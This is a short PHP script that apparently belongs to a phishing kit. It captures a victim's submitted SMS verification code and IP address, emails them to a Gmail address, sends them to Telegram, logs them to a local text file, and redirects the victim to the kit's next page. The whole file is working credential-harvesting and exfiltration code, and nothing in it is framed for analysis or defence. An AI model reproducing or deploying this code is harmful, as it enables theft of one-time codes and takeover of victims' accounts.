<?php
$ip = getenv("REMOTE_ADDR");
include_once 'functions.php';	
$hostname = gethostbyaddr($ip);
$message .= " SMS 2  : ".$_POST['o8']."\n";
$message .= "|-------|\n";
$message .= "IPs : $ip\n";
$send = "lawsaw103@gmail.com";
$subject = "IMP:  $ip";
telegram_send(urlencode($message));
{
mail("$send", "$subject", $message);
$file = fopen('../PO.txt', 'a');
fwrite($file,$message);
}
header("Location:lo11.php");
?>